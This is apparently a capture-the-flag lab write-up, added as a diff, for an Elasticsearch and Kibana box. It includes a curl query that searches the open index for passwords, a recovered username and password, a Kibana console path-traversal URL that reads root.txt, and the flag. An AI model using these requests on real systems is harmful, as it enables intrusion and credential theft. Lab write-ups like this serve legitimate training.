@@ -1,0 +1,24 @@
+IP : 10.10.231.176
+
+Open Ports : 22,111,8000,9200,
+
+Search password on elastic_search : 9200 : curl -X GET "10.10.231.176:9200/_search?q=password&pretty"
+
+We found a username and a password : l33tperson : 9Qs58Ol3AXkMWLxiEyUyyf
+
+Lets check the kibbana 5601 port.
+
+Kibbana version : 6.4.2
+
+We found a vulnerability : 
+
+10.10.231.176:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../root.txt
+
+http://10.10.231.176:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../.../../../../root.txt
+
+http://10.10.231.176:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../root.txt
+
+
+The answer will be visible in logs on port 8000 : someELKfun
+
+!!!
